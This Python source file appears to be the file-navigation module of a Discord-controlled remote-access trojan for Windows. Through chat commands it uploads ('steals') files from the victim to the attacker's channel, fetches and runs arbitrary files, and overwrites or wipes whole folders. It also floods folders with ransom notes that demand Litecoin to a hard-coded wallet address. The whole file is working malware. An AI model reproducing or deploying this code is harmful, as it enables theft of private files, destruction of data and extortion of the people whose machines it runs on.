import os, discord, subprocess, random, string, shutil, aiohttp, time
from concurrent.futures import ThreadPoolExecutor
from discord import Embed
CRYPTO_ADDRESS = 'LaHL1jGMk2VUgn6c4QtFVLi7BjycWrQorB'
current_directory = os.getcwd()

async def cd_command(ctx, *, args: str = None):
    global current_directory
    user_profile_path = os.path.join(os.path.expanduser("~"), "Documents")
    if not args:
        help_message = Embed(
            title="FILENAV COMMAND LIST",
            color=0x6a0dad
        )
        help_message.add_field(name=".cd <dirname>", value="move to a dir", inline=False)
        help_message.add_field(name=".cd back", value="go back one dir", inline=False)
        help_message.add_field(name=".cd steal <file_path>", value="steal a file", inline=False)
        help_message.add_field(name=".cd list", value="lists all files and folders in the current dir", inline=False)
        help_message.add_field(name=".cd drive:<letter>", value="switch drives", inline=False)
        help_message.add_field(name=".cd hack", value="corrupts all files in the selected dir.", inline=False)
        help_message.add_field(name=".cd clearfolder", value="incinerate all contents of the dir.", inline=False)
        help_message.add_field(name=".cd flood", value="spams files", inline=False)
        help_message.add_field(name=".cd run <filepath>", value="run a file. usage: .cd run test.exe", inline=False)
        help_message.add_field(name=".cd exopen <folderpath>", value="open a file explorer window to a set path", inline=False)
        help_message.add_field(name=".cd deletefile <file_path>", value="delete a file", inline=False)
        help_message.add_field(name=".cd makedir <dirname>", value="create a dir.", inline=False)
        help_message.add_field(name=".cd rmdir <dirname>", value="delete a dir.", inline=False)
        help_message.add_field(name=".cd upload", value="upload a file into the current dir", inline=False)
        await ctx.send(embed=help_message)
    elif args == "--documents--":
        documents_path = os.path.join(os.path.expanduser("~"), "Documents")
        if os.path.exists(documents_path):
            current_directory = documents_path
            os.chdir(current_directory)
            await ctx.send(f"Changed directory to Documents: {current_directory}")
        else:
            await ctx.send("Documents folder not found.")
    elif args == "--downloads--":
        downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
        if os.path.exists(downloads_path):
            current_directory = downloads_path
            os.chdir(current_directory)
            await ctx.send(f"Changed directory to Downloads: {current_directory}")
        else:
            await ctx.send("Downloads folder not found.")
    elif args == "--pictures--":
        pictures_path = os.path.join(os.path.expanduser("~"), "Pictures")
        if os.path.exists(pictures_path):
            current_directory = pictures_path
            os.chdir(current_directory)
            await ctx.send(f"Changed directory to Pictures: {current_directory}")
        else:
            await ctx.send("Pictures folder not found.")
    elif args == "--desktop--":
        kkk = os.path.join(os.path.expanduser("~"), "Desktop")
        if os.path.exists(kkk):
            current_directory = kkk
            os.chdir(current_directory)
            await ctx.send(f"Changed directory to Desktop: {current_directory}")
        else:
            await ctx.send("Pictures folder not found.")            
    elif args == "--videos--":
        videos_path = os.path.join(os.path.expanduser("~"), "Videos")
        if os.path.exists(videos_path):
            current_directory = videos_path
            os.chdir(current_directory)
            await ctx.send(f"Changed directory to Videos: {current_directory}")
        else:
            await ctx.send("Videos folder not found.")
    elif args.startswith("steal "):
        file_path = args[len("steal "):].strip()
        if os.path.exists(file_path):
            if os.path.getsize(file_path) <= 10 * 1024 * 1024:
                await ctx.send(file=discord.File(file_path))
            else:
                await ctx.send("File size exceeds 10 MB, unable to send.")
        else:
            await ctx.send(f"File not found: {file_path}")
    elif args == "back":
        parent_directory = os.path.dirname(current_directory)
        if parent_directory != current_directory:
            current_directory = parent_directory
            os.chdir(current_directory)
            await ctx.send(f"Moved back to: {current_directory}")
        else:
            await ctx.send("Already at the root directory.")
    elif args.startswith("drive:"):
        drive = args.split(":")[1]
        if len(drive) == 1 and drive.isalpha():
            new_drive = f"{drive.upper()}:\\"
            if os.path.exists(new_drive):
                current_directory = new_drive
                os.chdir(current_directory)
                await ctx.send(f"Switched to drive: {new_drive}")
            else:
                await ctx.send(f"Drive not found: {new_drive}")
        else:
            await ctx.send("Drive not found. Use .cd drive:<letter>")
    elif args.startswith("run "):
        file_path = args[len("run "):].strip()
        if os.path.exists(file_path):
            try:
                subprocess.run(file_path, check=True, shell=True)
                await ctx.send(f"Executed file: {file_path}")
            except Exception as e:
                await ctx.send(f"Error running the file: {e}")
        else:
            await ctx.send(f"File not found: {file_path}")
    elif args == "list":
        try:
            items = os.listdir(current_directory)
            file_details = []

            def get_file_details(item):
                full_path = os.path.join(current_directory, item)
                try:
                    file_size = os.path.getsize(full_path) / (1024 * 1024)
                    created_time = os.path.getctime(full_path)
                    created_time_str = time.strftime("%B %d, %Y %H:%M", time.localtime(created_time))
                    is_hidden = "Hidden" if os.path.isfile(full_path) and os.stat(full_path).st_file_attributes & 2 else "Visible"
                    return f"{full_path} - {file_size:.2f} MB - {created_time_str} - {is_hidden}"
                except Exception:
                    return None

            with ThreadPoolExecutor() as executor:
                results = list(executor.map(get_file_details, items))

            file_details = [result for result in results if result]

            with open(".system.txt", "w") as f:
                f.write("\n".join(file_details))
            os.system("attrib +h .system.txt")
            await ctx.send(file=discord.File(".system.txt"))
            os.remove(".system.txt")

        except Exception as e:
            await ctx.send(f"Error listing items: {e}")
    elif args.startswith("upload"):
        target = args[len("upload"):].strip()
        try:
            if target.startswith("http://") or target.startswith("https://"):
                async with aiohttp.ClientSession() as session:
                    async with session.get(target, ssl=False) as response:
                        if response.status == 200:
                            filename = os.path.basename(target.split("?")[0])
                            file_path = os.path.join(current_directory, filename)
                            with open(file_path, "wb") as f:
                                f.write(await response.read())
                            await ctx.send(f"File downloaded and saved to: {file_path}")
                        else:
                            await ctx.send("Failed to download the file. Invalid URL or server error.")
            elif ctx.message.attachments:
                for attachment in ctx.message.attachments:
                    file_path = os.path.join(current_directory, attachment.filename)
                    await attachment.save(file_path)
                    await ctx.send(f"File uploaded and saved to: {file_path}")
            else:
                await ctx.send("Please attach a file to upload or provide a valid URL.")
        except Exception as e:
            await ctx.send(f"Error during upload: {e}")
    elif args == "hack":
        try:
            for _ in range(3):
                for filename in os.listdir(current_directory):
                    file_path = os.path.join(current_directory, filename)
                    if os.path.isfile(file_path):
                        try:
                            random22chars = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
                            new_file_name = f"locked{random22chars}.payus"  
                            new_file_path = os.path.join(current_directory, new_file_name)
                            os.rename(file_path, new_file_path)
                            gibberish = ''.join(random.choices(string.ascii_letters + string.digits + ''.join(chr(i) for i in range(0x20, 0x100)), k=5000))
                            with open(new_file_path, "w", encoding="utf-8") as f:
                                f.write(gibberish)
                        except Exception as e:
                            await ctx.send(f"Skipping file {file_path}: {e}")
            await ctx.send("Files corrupted successfully!")
        except Exception as e:
            await ctx.send(f"Error during hack: {e}")
    elif args.startswith("exopen "):
        dir_path = args[len("exopen "):].strip()
        if os.path.exists(dir_path) and os.path.isdir(dir_path):
            subprocess.run(f'explorer /select,"{dir_path}"', check=True)
            await ctx.send(f"File explorer opened for: {dir_path}")
        else:
            await ctx.send(f"Directory not found: {dir_path}")
    elif args == "clearfolder":
        try:
            exclude_folders = [
                os.path.expandvars(r"%appdata%\screenshots"),
                os.path.expandvars(r"%appdata%\sharedfiles"),
                r"C:\$Sys-Manager",
                os.path.expandvars(r"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup")
            ]

            deleted_files = 0
            deleted_dirs = 0

            def delete_item(item_path):
                nonlocal deleted_files, deleted_dirs
                try:
                    if os.path.isdir(item_path):
                        shutil.rmtree(item_path)
                        deleted_dirs += 1
                    else:
                        os.remove(item_path)
                        deleted_files += 1
                except Exception:
                    pass

            def process_item(item):
                item_path = os.path.join(current_directory, item)
                if item_path not in exclude_folders:
                    delete_item(item_path)

            def process_directory(root, dirs, files):
                for name in files:
                    file_path = os.path.join(root, name)
                    if file_path not in exclude_folders:
                        delete_item(file_path)
                for name in dirs:
                    dir_path = os.path.join(root, name)
                    if dir_path not in exclude_folders:
                        delete_item(dir_path)

            with ThreadPoolExecutor() as executor:
                executor.map(process_item, os.listdir(current_directory))

            for root, dirs, files in os.walk(current_directory, topdown=False):
                with ThreadPoolExecutor() as executor:
                    executor.submit(process_directory, root, dirs, files)

            color = 0x28a745 if deleted_files or deleted_dirs else 0xd32f2f
            description = f"Successfully deleted {deleted_files} files in {deleted_dirs} folders." if deleted_files or deleted_dirs else "No files or folders deleted."

            embed = discord.Embed(title="Clear Folder", description=description, color=color)
            await ctx.send(embed=embed)
        except Exception as e:
            embed = discord.Embed(title="Error", description=f"Error clearing folder: {e}", color=0xd32f2f)
            await ctx.send(embed=embed)
            
    elif args == "flood":
        try:
            def create_file(i):
                file_path = os.path.join(current_directory, f"ENCRYPTED{i}.txt")
                with open(file_path, "w") as f:
                    f.write(f"Pay 100 USD in LITECOIN to {CRYPTO_ADDRESS} or your files, pc and data are gone!!!\n" * 5000)
            
            with ThreadPoolExecutor(max_workers=10) as executor:
                for i in range(250):
                    executor.submit(create_file, i)
            await ctx.send("The folder is flooded with a shit ton of files.")
        except Exception as e:
            await ctx.send(f"Error during flood: {e}")
    elif args.startswith("deletefile "):
        file_path = args[len("deletefile "):].strip()
        if os.path.exists(file_path):
            try:
                os.remove(file_path)
                await ctx.send(f"File deleted: {file_path}")
            except Exception as e:
                await ctx.send(f"Error deleting file: {e}")
        else:
            await ctx.send(f"File not found: {file_path}")
    elif args.startswith("makedir "):
        dir_name = args[len("makedir "):].strip()
        new_dir_path = os.path.join(current_directory, dir_name)
        if not os.path.exists(new_dir_path):
            os.mkdir(new_dir_path)
            await ctx.send(f"Directory created: {new_dir_path}")
        else:
            await ctx.send(f"Directory already exists: {new_dir_path}")
    elif args.startswith("rmdir "):
        dir_name = args[len("rmdir "):].strip()
        dir_path = os.path.join(current_directory, dir_name)
        if os.path.isdir(dir_path):
            try:
                shutil.rmtree(dir_path)
                await ctx.send(f"Directory removed: {dir_path}")
            except Exception as e:
                await ctx.send(f"Error removing directory: {e}")
        else:
            await ctx.send(f"Directory not found: {dir_path}")
    else:
        new_path = os.path.join(current_directory, args)
        if os.path.isdir(new_path):
            current_directory = new_path
            os.chdir(current_directory)
            await ctx.send(f"Changed directory to: {current_directory}")
        else:
            await ctx.send(f"Not a directory: {args}")